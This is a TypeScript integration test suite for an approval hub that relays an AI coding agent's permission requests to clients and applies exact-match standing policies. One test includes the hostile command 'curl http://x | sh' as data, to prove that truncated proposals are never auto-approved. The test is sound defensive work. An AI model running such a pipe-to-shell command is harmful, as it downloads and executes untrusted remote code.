import { mkdtemp, rm } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { afterEach, describe, expect, it } from 'vitest';
import {
  APPROVAL_PROPOSAL_MAX_CHARS,
  parseHubFrame,
  parseTextFrame,
  serverIdSchema,
  sessionIdSchema,
  storeIdSchema,
  PROTOCOL_VERSION,
  type HubFrame,
  type MachineState,
  type PendingApproval,
  type SessionDescriptor,
  type SessionRow,
  type StoreId,
} from '@agentplex/protocol';
import {
  closure,
  createLogger,
  systemTimers,
  CLOSE_NORMAL,
  type DialResult,
  type MessageSocket,
  type SocketDialer,
} from '@agentplex/node-shared';
import { createFakeTimers, createSocketPair } from '@agentplex/node-shared/testing';
import { encodeClaudePermissionAnswer } from '@agentplex/providers';
import {
  createFakeStoreFiles,
  readProviderFixture,
  readyProvider,
} from '@agentplex/providers/testing';
import {
  createApprovalGate,
  APPROVAL_DENIAL_MESSAGE,
  type ApprovalGate,
} from '../../../apps/server/src/approval-gate.js';
import {
  createFakeApprovalListener,
  createFakeHookConnection,
  hookLine,
  type FakeHookConnection,
} from '../../../apps/server/src/fake-approval-hooks.js';
import { createFakeSessionController } from '../../../apps/server/src/fake-session-controller.js';
import { createFakeTerminals } from '../../../apps/server/src/fake-terminals.js';
import { createFakeMachineLoadReader } from '../../../apps/server/src/fake-machine-probe.js';
import { createHubAudience } from '../../../apps/server/src/hub-audience.js';
import { serveServerEnd } from './server-end.js';
import { createFakeBeaconSource } from '../../../apps/hub/src/features/discovery/fake-discovery.js';
import { createFakeWebAssets } from '../../../apps/hub/src/features/web/fake-web.js';
import { createSqliteDatabase, type SqliteDatabase } from '../../../apps/hub/src/db/sqlite.js';
import { loadMigrations } from '../../../apps/hub/src/db/migration-files.js';
import { migrate } from '../../../apps/hub/src/db/migrations.js';
import { nodeMigrationFileSystem } from '../../../apps/hub/src/db/node-migration-files.js';
import { registerServer } from '../../../apps/hub/src/features/pairing/server-registrations.js';
import { newServerRegistrationSchema } from '../../../apps/hub/src/features/pairing/pairing.js';
import { startHub, type Hub } from '../../../apps/hub/src/hub.js';

/**
 * An approval, end to end: an agent blocks, every client is told, one of them
 * answers, and the blocked process is released exactly once.
 *
 * The races are the ticket, and none of them can be shown by a unit test on
 * either side alone. Two clients answering at one moment is two sockets into
 * one hub; a client answering a question the agent already took back is a
 * withdrawal travelling the other way while the answer travels this way; and a
 * machine going quiet with a question open on it is the hub deciding what a row
 * may still offer. So this drives the real hub against the real server end of
 * the protocol, and the only fake below the wire is the socket the hook would
 * have connected on -- which is the one thing a suite cannot open and the one
 * thing none of these rules are about. `node-approval-listener.integration.test`
 * is where that socket is proved.
 *
 * The payload the hook presents is the captured one: a real `PermissionRequest`
 * from a real `claude`, read from the fixture the provider package's own tests
 * read. Nothing here writes a permission payload by hand, so a provider that
 * changes the shape of one breaks this suite rather than passing it.
 */

const logger = createLogger('error', () => {});
const START = 1_756_000_000_000;
const CLIENT_TOKEN = 'the-client-token-typed-on-the-device';
const HOST = '127.0.0.1';

const WORK = storeIdSchema.parse('store-work');

/** The payload a real hook sent, and the session id inside it. */
const CAPTURED = await readProviderFixture('claude-permission-request.json');
const BLOCKED = (JSON.parse(CAPTURED) as { session_id: string }).session_id;

/** The command inside the captured payload, which a client renders verbatim. */
const PROPOSED_COMMAND = 'prisma migrate deploy --schema ./db';

const clock = { now: () => START };

function descriptor(sessionId: string): SessionDescriptor {
  return {
    storeId: WORK,
    sessionId: sessionIdSchema.parse(sessionId),
    provider: 'claude',
    status: 'awaiting-permission',
    updatedAt: START - 60_000,
    cwd: '/Users/robert/code/agentplex',
    branch: null,
    title: null,
    uncommitted: null,
  };
}

/**
 * One machine: its gate, the hooks connecting to it, and the socket the hub
 * holds.
 *
 * The gate outlives a connection deliberately, because it does on a real box:
 * a blocked process belongs to the machine, not to whichever hub happens to be
 * dialled in at the moment it blocks.
 */
interface Machine {
  readonly gate: ApprovalGate;
  /** A hook connects, sends the captured payload, and blocks on an answer. */
  block(): FakeHookConnection;
  /**
   * The same, with one field of the captured payload changed.
   *
   * Still the real shape, because everything but the one value under test is
   * the fixture: what a rule matched and what a rule missed by a character have
   * to be two readings of one payload, or the difference being asserted would
   * be the difference between two hand-written objects.
   */
  blockProposing(command: string): FakeHookConnection;
  /** The hub's end of the last connection this machine accepted. */
  socket(): MessageSocket | null;
}

let machine: Machine | null = null;

function startMachine(): Machine {
  const controller = createFakeSessionController();
  controller.setReport({ storeId: WORK, sessions: [descriptor(BLOCKED)], holding: [] });
  // A real scan reads a disk and takes event-loop turns; a fake resolving in
  // the handshake's own microtask would race its report past the hub attaching
  // its listener, an ordering no real store scan can produce.
  const sessions = {
    ...controller,
    report: async (storeId: StoreId) => {
      await new Promise((resolve) => setImmediate(resolve));
      return controller.report(storeId);
    },
  };
  const audience = createHubAudience({ sessions, logger });
  const listener = createFakeApprovalListener();
  let minted = 0;
  const gate = createApprovalGate({
    listener,
    clock,
    ids: { newId: () => `approval-${(minted += 1)}` },
    // The gate's only timer is the deadline it gives up on, which is ten
    // minutes away and never reached here. A fake keeps it off the event loop.
    timers: createFakeTimers(),
    tokens: { newToken: () => `launch-secret-${(minted += 1)}` },
    logger,
    // The one line `server.ts` writes: what the gate says goes to every hub
    // that is connected, and to nothing else.
    onEvent: (event) => void audience.tellAll(event),
  });

  let held: MessageSocket | null = null;
  const machine: Machine = {
    gate,
    block(): FakeHookConnection {
      const admission = gate.admit(WORK);
      const hook = createFakeHookConnection(hookLine(admission.secret, CAPTURED));
      listener.present(hook.connection);
      return hook;
    },
    blockProposing(command: string): FakeHookConnection {
      const payload = JSON.parse(CAPTURED) as { tool_input: Record<string, unknown> };
      payload.tool_input = { ...payload.tool_input, command };
      const admission = gate.admit(WORK);
      const hook = createFakeHookConnection(hookLine(admission.secret, JSON.stringify(payload)));
      listener.present(hook.connection);
      return hook;
    },
    socket: () => held,
  };

  dialAnswers = (): DialResult => {
    const { hubEnd, serverEnd } = createSocketPair();
    held = serverEnd;
    serveServerEnd(serverEnd, {
      sessions,
      audience,
      approvals: gate,
      terminals: createFakeTerminals().terminals,
      machineLoad: createFakeMachineLoadReader(),
      identity: { serverId: serverIdSchema.parse('server-laptop'), token: 'tok-laptop.example' },
      stores: [{ storeId: WORK, path: '/Users/robert/code' }],
      providers: [readyProvider()],
      logger,
    });
    return { ok: true, socket: hubEnd };
  };

  return machine;
}

/** Filled in by the machine, because the hub dials before a test can. */
let dialAnswers: () => DialResult = () => ({ ok: false, problem: 'no machine' });

const dialer: SocketDialer = {
  dial: async (address: string): Promise<DialResult> => {
    if (new URL(address).hostname !== 'laptop.example') {
      return { ok: false, problem: 'connection refused' };
    }
    return dialAnswers();
  },
};

const MIGRATIONS_DIRECTORY = fileURLToPath(
  new URL('../../../apps/hub/migrations', import.meta.url),
);

interface Fleet {
  readonly hub: Hub;
  readonly cleanup: () => Promise<void>;
}

async function openHub(database: SqliteDatabase): Promise<Hub> {
  let minted = 0;
  return startHub({
    database,
    logger,
    ids: { newId: () => `id-${(minted += 1)}` },
    clock,
    clientToken: CLIENT_TOKEN,
    tokens: { newToken: () => 'unused' },
    dialer,
    discovery: createFakeBeaconSource(),
    // Real timers, for the reason the attention suite uses them: this is about
    // what a client is *sent*, and the broadcast's flush is scheduled.
    timers: systemTimers,
    migrationsDirectory: MIGRATIONS_DIRECTORY,
    migrationFileSystem: nodeMigrationFileSystem,
    webAssets: createFakeWebAssets(),
    host: HOST,
    port: 0,
    localServer: null,
    // No push: this suite is not about it, and the two seams it needs are a
    // cryptographic mint and a POST to somebody else's service.
    push: null,
    files: createFakeStoreFiles(),
  });
}

async function startFleetHub(): Promise<Fleet> {
  const directory = await mkdtemp(join(tmpdir(), 'agentplex-approvals-'));
  const database = createSqliteDatabase(join(directory, 'hub.db'));
  await migrate(
    database,
    await loadMigrations(MIGRATIONS_DIRECTORY, nodeMigrationFileSystem),
    logger,
    clock,
  );
  await registerServer(
    database,
    { newId: () => 'registration-laptop' },
    clock,
    newServerRegistrationSchema.parse({
      label: 'laptop',
      address: 'wss://laptop.example:8443',
      token: 'tok-laptop.example',
    }),
  );

  const hub = await openHub(database);
  return {
    hub,
    cleanup: async () => {
      await hub.stop();
      await database.close();
      await rm(directory, { recursive: true, force: true });
    },
  };
}

/** A client on a linked socket pair: the ticket exchange has its own suite. */
interface Client {
  /** Sends one frame and waits for the hub's answer to it, whatever it is. */
  ask(frame: Record<string, unknown>): Promise<HubFrame>;
  /** Sends one frame and hands back the wait, so two can be in flight at once. */
  asking(frame: Record<string, unknown>): Promise<HubFrame>;
  /** The newest machine state this client has been sent. */
  state(): MachineState | null;
}

function openClient(hub: Hub): Client {
  const { hubEnd, serverEnd } = createSocketPair();
  const received: string[] = [];
  const waiting: (() => void)[] = [];
  serverEnd.onMessage((text) => {
    received.push(text);
    for (const wake of waiting.splice(0)) wake();
  });
  hub.clients.attach(hubEnd);

  const read = (text: string): HubFrame => {
    const parsed = parseTextFrame(parseHubFrame, text);
    if (!parsed.ok) throw new Error(`the hub sent something unreadable: ${parsed.reason}`);
    return parsed.value;
  };

  let nextId = 0;
  serverEnd.send(
    JSON.stringify({ type: 'hello', id: (nextId += 1), protocolVersion: PROTOCOL_VERSION }),
  );

  const asking = async (frame: Record<string, unknown>): Promise<HubFrame> => {
    const id = (nextId += 1);
    serverEnd.send(JSON.stringify({ ...frame, id }));
    for (;;) {
      for (const text of received) {
        const answer = read(text);
        if ('replyTo' in answer && answer.replyTo === id) return answer;
      }
      await new Promise<void>((resolve) => waiting.push(resolve));
    }
  };

  return {
    ask: asking,
    asking,
    state(): MachineState | null {
      const states = received
        .map(read)
        .filter(
          (frame): frame is Extract<HubFrame, { type: 'machine-state' }> =>
            frame.type === 'machine-state',
        );
      return states.at(-1)?.state ?? null;
    },
  };
}

async function until(predicate: () => boolean, what: string): Promise<void> {
  for (let attempt = 0; attempt < 2_000; attempt += 1) {
    if (predicate()) return;
    await new Promise((resolve) => setImmediate(resolve));
  }
  throw new Error(`timed out waiting for ${what}`);
}

/** The blocked session's row, as the newest state this client holds has it. */
function rowOf(client: Client): SessionRow | null {
  const state = client.state();
  return (
    state?.stores
      .find((store) => store.storeId === WORK)
      ?.sessions.find((session) => session.descriptor.sessionId === BLOCKED) ?? null
  );
}

/** What this client believes is waiting for an answer on that session. */
function pendingOn(client: Client): readonly PendingApproval[] {
  return rowOf(client)?.approvals ?? [];
}

async function seen(client: Client, what: string): Promise<readonly PendingApproval[]> {
  await until(() => pendingOn(client).length > 0, what);
  return pendingOn(client);
}

let fleet: Fleet | null = null;

/** A hub, a machine, and a client already looking at the blocked session. */
async function start(): Promise<{ hub: Hub; client: Client }> {
  machine = startMachine();
  const started = await startFleetHub();
  fleet = started;
  const client = openClient(started.hub);
  await until(() => rowOf(client) !== null, 'the session to reach the client');
  return { hub: started.hub, client };
}

describe('an approval, over a hub and a server', () => {
  afterEach(async () => {
    await fleet?.cleanup();
    fleet = null;
    machine = null;
    dialAnswers = () => ({ ok: false, problem: 'no machine' });
  });

  it('reaches every client, is applied once, and the other client is told it ended', async () => {
    const { hub, client } = await start();
    const second = openClient(hub);
    await until(() => rowOf(second) !== null, 'the session to reach the second client');

    const hook = machine?.block();
    const [pending] = await seen(client, 'the request to reach the first client');
    await seen(second, 'the request to reach the second client');

    // What the agent proposed is data the client renders, carried from the
    // captured payload without anything on this path spawning any of it.
    expect(pending?.tool).toBe('Bash');
    expect(pending?.proposal).toContain(PROPOSED_COMMAND);
    expect(pending?.requestedAt).toBe(START);
    // The session's own status is untouched: it is what the provider's record
    // says, and an approval is never a second authority on that word.
    expect(rowOf(client)?.descriptor.status).toBe('awaiting-permission');

    const answered = await client.ask({
      type: 'approval-decide',
      subject: { kind: 'session', storeId: WORK, sessionId: BLOCKED },
      approvalId: pending?.approvalId,
      decision: 'grant',
    });

    // The receipt is about the request rather than about the tap, and it does
    // not arrive until the machine holding the blocked process has said what
    // happened -- which is why this is an integration test and not two.
    expect(answered).toMatchObject({ type: 'approval-decided', outcome: 'granted' });
    expect(hook?.writes).toEqual([encodeClaudePermissionAnswer({ behavior: 'allow' })]);

    // And the client that did not tap is told, where every change reaches it:
    // the approval leaves the session row of the next state.
    await until(() => pendingOn(second).length === 0, 'the second client to be told it ended');
    expect(pendingOn(client)).toEqual([]);
  });

  it('denies in the words the machine composes, and nothing a client chose', async () => {
    const { client } = await start();
    const hook = machine?.block();
    const [pending] = await seen(client, 'the request to reach the client');

    const answered = await client.ask({
      type: 'approval-decide',
      subject: { kind: 'session', storeId: WORK, sessionId: BLOCKED },
      approvalId: pending?.approvalId,
      decision: 'deny',
    });

    expect(answered).toMatchObject({ type: 'approval-decided', outcome: 'denied' });
    expect(hook?.writes).toEqual([
      encodeClaudePermissionAnswer({ behavior: 'deny', message: APPROVAL_DENIAL_MESSAGE }),
    ]);
  });

  it('decides once when two clients answer at one moment, and tells the loser what happened', async () => {
    const { hub, client } = await start();
    const second = openClient(hub);
    await until(() => rowOf(second) !== null, 'the session to reach the second client');

    const hook = machine?.block();
    const [pending] = await seen(client, 'the request to reach the first client');
    await seen(second, 'the request to reach the second client');

    // Both in flight before either is answered, which is the race a person
    // produces with two phones and one question.
    const granting = client.asking({
      type: 'approval-decide',
      subject: { kind: 'session', storeId: WORK, sessionId: BLOCKED },
      approvalId: pending?.approvalId,
      decision: 'grant',
    });
    const denying = second.asking({
      type: 'approval-decide',
      subject: { kind: 'session', storeId: WORK, sessionId: BLOCKED },
      approvalId: pending?.approvalId,
      decision: 'deny',
    });

    const [granted, denied] = await Promise.all([granting, denying]);

    // One answer reached the agent, and it is the first one: a command that was
    // granted must not also be denied.
    expect(hook?.writes).toEqual([encodeClaudePermissionAnswer({ behavior: 'allow' })]);
    // Both clients are told what became of the request. The loser is owed the
    // ending rather than a sentence saying it was wrong -- it was late, which
    // is a different thing and one it can draw.
    expect(granted).toMatchObject({ type: 'approval-decided', outcome: 'granted' });
    expect(denied).toMatchObject({ type: 'approval-decided', outcome: 'granted' });
  });

  it('shows nothing pending to a client that arrives after the agent took it back', async () => {
    const { hub, client } = await start();
    const hook = machine?.block();
    const [pending] = await seen(client, 'the request to reach the client');

    // The agent stopped asking: its hook went away, which is what the gate
    // reads as a withdrawal.
    hook?.disconnect();
    await until(() => pendingOn(client).length === 0, 'the withdrawal to reach the client');

    // The reconnection: a client that was not here for any of it, and whose
    // first state is the whole state.
    const late = openClient(hub);
    await until(() => rowOf(late) !== null, 'the session to reach the late client');
    expect(pendingOn(late)).toEqual([]);

    // And one that answers it anyway -- a tab left open on the old row -- is
    // told the ending rather than that the hub never heard of it.
    const answered = await late.ask({
      type: 'approval-decide',
      subject: { kind: 'session', storeId: WORK, sessionId: BLOCKED },
      approvalId: pending?.approvalId,
      decision: 'grant',
    });
    expect(answered).toMatchObject({ type: 'approval-decided', outcome: 'withdrawn' });
    expect(hook?.writes).toEqual([]);
  });

  it('withdraws what a machine was holding when the hub loses its connection', async () => {
    const { client } = await start();
    machine?.block();
    await seen(client, 'the request to reach the client');

    // The machine goes away with the question still open on it. It may well
    // still be blocked over there, but no answer given here can reach it, and
    // a row offering a button that cannot work is the over-claim this whole
    // path is shaped against.
    machine?.socket()?.close(closure(CLOSE_NORMAL, 'the machine went away'));

    await until(
      () => pendingOn(client).length === 0,
      'the approval to leave the row with the connection',
    );
  });

  it('refuses an approval this hub is holding none of, as a reply and not a closed socket', async () => {
    const { client } = await start();

    const answered = await client.ask({
      type: 'approval-decide',
      subject: { kind: 'session', storeId: WORK, sessionId: BLOCKED },
      approvalId: 'approval-nobody-minted',
      decision: 'grant',
    });

    // No outcome on it, because there is none: this hub never saw the id, and
    // inventing `withdrawn` would be stating what became of something it never
    // held. A refusal, so the client stops waiting.
    expect(answered).toMatchObject({ type: 'refusal', code: 'refused' });

    // Still talking, and still able to answer the request that does exist.
    machine?.block();
    const [pending] = await seen(client, 'the request to reach the client');
    const granted = await client.ask({
      type: 'approval-decide',
      subject: { kind: 'session', storeId: WORK, sessionId: BLOCKED },
      approvalId: pending?.approvalId,
      decision: 'grant',
    });
    expect(granted).toMatchObject({ type: 'approval-decided', outcome: 'granted' });
  });
});

/**
 * The standing policy, end to end: a rule a client wrote, and a request it
 * answers without anybody being asked.
 *
 * This is the half of the feature that cannot be shown on either side alone.
 * A rule is a row in the hub's database, keyed by a project in the hub's node
 * tree; the request it answers is a process parked on a socket on another
 * machine; and what a person sees is whichever of those the machine state
 * happens to carry at the moment they look. So the suite drives the real hub
 * against the real server end, files the blocked session under a project the
 * way a user would, and asserts on the hook's own bytes as well as on the
 * frames -- because a policy that looked right on a screen and released
 * nothing, or released something and told nobody, would pass a narrower test.
 *
 * Every assertion about matching is made on the payload a real `claude` sent,
 * varied in one field. What a rule missed by one character has to be the same
 * payload as what it matched, or the difference under test would be the
 * difference between two objects somebody wrote by hand.
 */
describe('a standing policy, over a hub and a server', () => {
  afterEach(async () => {
    await fleet?.cleanup();
    fleet = null;
    machine = null;
    dialAnswers = () => ({ ok: false, problem: 'no machine' });
  });

  /** The project a client made, with the blocked session filed under it. */
  async function fileUnderProject(client: Client): Promise<string> {
    const created = await client.ask({
      type: 'project-create',
      name: 'agentplex',
      directory: '/Users/robert/code/agentplex',
    });
    if (created.type !== 'project-created') {
      throw new Error(`the project was refused: ${JSON.stringify(created)}`);
    }

    // The session's node is discovered at the root and moved by the user, so
    // this is the move a user makes rather than a row written behind the tree.
    const tree = await client.ask({ type: 'layout-request' });
    if (tree.type !== 'layout') throw new Error('the tree was refused');
    const node = tree.nodes.find((entry) => entry.anchor?.sessionId === BLOCKED);
    if (node === undefined) throw new Error('the blocked session has no node');

    const moved = await client.ask({
      type: 'node-move',
      nodeId: node.id,
      parentId: created.nodeId,
      position: 0,
    });
    if (moved.type !== 'node-moved') {
      throw new Error(`the move was refused: ${JSON.stringify(moved)}`);
    }
    return created.nodeId;
  }

  /** The exact proposal one request carried, read off the row a client holds. */
  async function proposalOf(client: Client, hook: FakeHookConnection): Promise<string> {
    const [pending] = await seen(client, 'the request to reach the client');
    if (pending === undefined) throw new Error('nothing is pending');
    const proposal = pending.proposal;
    await client.ask({
      type: 'approval-decide',
      subject: { kind: 'session', storeId: WORK, sessionId: BLOCKED },
      approvalId: pending.approvalId,
      decision: 'deny',
    });
    expect(hook.writes).toHaveLength(1);
    await until(() => pendingOn(client).length === 0, 'the first request to end');
    return proposal;
  }

  it('grants a matching request, releases the hook, and tells every client it ended', async () => {
    const { hub, client } = await start();
    const second = openClient(hub);
    await until(() => rowOf(second) !== null, 'the session to reach the second client');
    const projectId = await fileUnderProject(client);

    // The rule is the exact text a person read above Allow, taken from the
    // request they answered. That is the whole of what step four's "always
    // allow this" control will do, and it is why exact match is usable at all.
    const proposal = await proposalOf(client, machine?.block() as FakeHookConnection);
    const policy = await client.ask({
      type: 'approval-policy-add',
      projectId,
      rule: { tool: 'Bash', proposal },
    });
    expect(policy).toMatchObject({ type: 'approval-policy', projectId });

    const hook = machine?.block();

    // The hook is released with nobody asked, which is the half no frame can
    // show and the half that would be worth nothing if it were wrong.
    await until(() => (hook?.writes.length ?? 0) > 0, 'the hook to be released');
    expect(hook?.writes).toEqual([encodeClaudePermissionAnswer({ behavior: 'allow' })]);

    // Every client is told the request ended, where every change reaches it.
    await until(() => pendingOn(second).length === 0, 'the second client to be told it ended');
    expect(pendingOn(client)).toEqual([]);

    // Nothing was asked of anybody: the only frames these two clients sent are
    // the ones this test sent, and neither was a decision on this request.
    expect(pendingOn(second)).toEqual([]);
  });

  it('asks about a request that differs from the rule by one character', async () => {
    const { client } = await start();
    const projectId = await fileUnderProject(client);
    const proposal = await proposalOf(client, machine?.block() as FakeHookConnection);
    await client.ask({
      type: 'approval-policy-add',
      projectId,
      rule: { tool: 'Bash', proposal },
    });

    // One flag more than the text somebody approved. Under a prefix this was
    // granted; the agent writes what follows the rule, so it is a question.
    const hook = machine?.blockProposing(`${PROPOSED_COMMAND} --force`);
    const [pending] = await seen(client, 'the second request to reach the client');
    expect(pending?.answeredBy).toBe(null);
    expect(hook?.writes).toEqual([]);
  });

  it('asks again the moment the rule is removed', async () => {
    const { client } = await start();
    const projectId = await fileUnderProject(client);
    const proposal = await proposalOf(client, machine?.block() as FakeHookConnection);
    const added = await client.ask({
      type: 'approval-policy-add',
      projectId,
      rule: { tool: 'Bash', proposal },
    });
    if (added.type !== 'approval-policy') throw new Error('the rule was refused');
    const [written] = added.rules;

    const emptied = await client.ask({
      type: 'approval-policy-remove',
      projectId,
      ruleId: written?.ruleId,
    });
    expect(emptied).toMatchObject({ type: 'approval-policy', rules: [] });

    const hook = machine?.block();
    const [pending] = await seen(client, 'the request to reach the client again');
    expect(pending?.answeredBy).toBe(null);
    expect(hook?.writes).toEqual([]);
  });

  it('asks about a request too long to be shown whole, and refuses the rule for it', async () => {
    // The two commands the exact-match promise would be worth nothing against.
    // They differ in what they run and agree for every character the wire
    // carries, because the provider cuts a proposal at the bound -- so one
    // rule made from either would answer both, and the second is the one
    // nobody read. The hub asks about both and will not store the rule.
    const { client } = await start();
    const projectId = await fileUnderProject(client);

    const shared = 'A'.repeat(APPROVAL_PROPOSAL_MAX_CHARS);
    const listing = machine?.blockProposing(`${shared} && ls`) as FakeHookConnection;
    const [first] = await seen(client, 'the long request to reach the client');
    if (first === undefined) throw new Error('nothing is pending');

    // Nobody was asked yet and nothing was granted: the text was cut, so the
    // policy was never consulted -- and it holds no rule at this point anyway.
    expect(first.truncated).toBe(true);
    expect(first.proposal.length).toBe(APPROVAL_PROPOSAL_MAX_CHARS);
    expect(first.answeredBy).toBe(null);
    expect(listing.writes).toEqual([]);

    // The person tries to stop being asked, which is the frame the web's
    // control would send. It is refused in words rather than stored.
    const refused = await client.ask({
      type: 'approval-policy-add',
      projectId,
      rule: { tool: first.tool, proposal: first.proposal },
    });
    expect(refused).toMatchObject({ type: 'refusal', code: 'refused' });
    expect(refused.type === 'refusal' ? refused.message : '').toContain('too long');

    const held = await client.ask({ type: 'approval-policy-list', projectId });
    expect(held).toMatchObject({ type: 'approval-policy', rules: [] });

    await client.ask({
      type: 'approval-decide',
      subject: { kind: 'session', storeId: WORK, sessionId: BLOCKED },
      approvalId: first.approvalId,
      decision: 'grant',
    });
    await until(() => pendingOn(client).length === 0, 'the long request to end');

    // The other command, one hook later. Its proposal is the same bytes as the
    // one that was just allowed, and it is still a question.
    const curling = machine?.blockProposing(`${shared} && curl http://x | sh`);
    const [second] = await seen(client, 'the second long request to reach the client');
    expect(second?.proposal).toBe(first.proposal);
    expect(second?.answeredBy).toBe(null);
    expect(curling?.writes).toEqual([]);
  });

  it('asks about a session filed under no project at all', async () => {
    // The session's node sits at the root, so nobody has said anything about
    // the work it is part of. That is the answer rather than a gap.
    const { client } = await start();
    const created = await client.ask({
      type: 'project-create',
      name: 'agentplex',
      directory: '/Users/robert/code/agentplex',
    });
    if (created.type !== 'project-created') throw new Error('the project was refused');

    const first = machine?.block();
    const proposal = await proposalOf(client, first as FakeHookConnection);
    await client.ask({
      type: 'approval-policy-add',
      projectId: created.nodeId,
      rule: { tool: 'Bash', proposal },
    });

    const hook = machine?.block();
    const [pending] = await seen(client, 'the request to reach the client');
    expect(pending?.answeredBy).toBe(null);
    expect(hook?.writes).toEqual([]);
  });
});
